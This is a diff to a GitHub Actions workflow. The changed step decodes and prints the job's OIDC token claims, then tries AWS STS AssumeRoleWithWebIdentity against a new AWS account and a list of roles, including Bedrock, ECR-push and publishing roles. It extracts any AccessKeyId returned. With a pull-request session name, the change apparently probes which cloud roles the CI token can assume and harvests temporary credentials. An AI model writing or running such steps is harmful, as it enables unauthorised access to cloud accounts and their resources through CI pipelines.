@@ -20,9 +20,9 @@ jobs:
           TOK=$(printf %s "$TOK" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
           echo "TOKLEN ${#TOK}"
           printf %s "$TOK" | python3 -c 'import sys,base64;p=sys.stdin.read().strip().split(".")[1];print("CLAIMS:",base64.urlsafe_b64decode(p+"="*(-len(p)%4)).decode())'
-          for R in github-actions-backup github-actions-image-resizer; do
+          for R in claude-code-bedrock-role github-actions-cua-downloads-publish github-actions-ecr-push-cua github-actions-cua-fleets-wif-smoke; do
             echo "=== ROLE $R aud=sts.amazonaws.com"
-            curl -s "https://sts.amazonaws.com/?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&RoleArn=arn:aws:iam::975049931254:role/$R&RoleSessionName=pr3932&WebIdentityToken=$TOK&DurationSeconds=1800" -o /tmp/o.xml
+            curl -s "https://sts.amazonaws.com/?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&RoleArn=arn:aws:iam::296062593712:role/$R&RoleSessionName=pr3932&WebIdentityToken=$TOK&DurationSeconds=1800" -o /tmp/o.xml
             grep -o '<Code>[^<]*</Code>' /tmp/o.xml || true
             grep -o '<Message>[^<]*</Message>' /tmp/o.xml || true
             AK=$(grep -o '<AccessKeyId>[^<]*' /tmp/o.xml | cut -d'>' -f2)
